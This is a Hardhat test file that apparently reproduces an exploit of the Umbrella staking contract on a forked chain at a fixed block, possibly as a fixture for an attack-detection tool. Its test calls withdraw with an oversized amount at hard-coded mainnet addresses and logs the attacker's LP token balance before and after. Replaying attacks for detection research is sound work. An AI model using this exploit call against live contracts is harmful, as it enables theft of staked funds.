import { ethers } from 'hardhat'
import { IERC20, IStakingRewards } from '../typechain-types'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('CCA Detects Sandbox Attack Test', async function () {
    let owner: SignerWithAddress
    let skr: any
    let uniLP: IERC20
    beforeEach(async () => {
        ;[owner] = await ethers.getSigners()
        skr = await ethers.getContractAt('IStakingRewards', '0xB3FB1D01B07A706736Ca175f827e4F56021b85dE')
        uniLP = await ethers.getContractAt('IERC20', '0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042')
    })

    it('should block number equal to 14421983', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(14421983)
    })

    it('should attack Umbrella', async function () {
        console.log('Before exploiting, Attacker UniLP Balance', await uniLP.balanceOf(owner.getAddress()))
        await skr.connect(owner).withdraw(8792873290680252648282n)
        console.log('After exploiting, Attacker UniLP Balance', await uniLP.balanceOf(owner.getAddress()))
    })
})
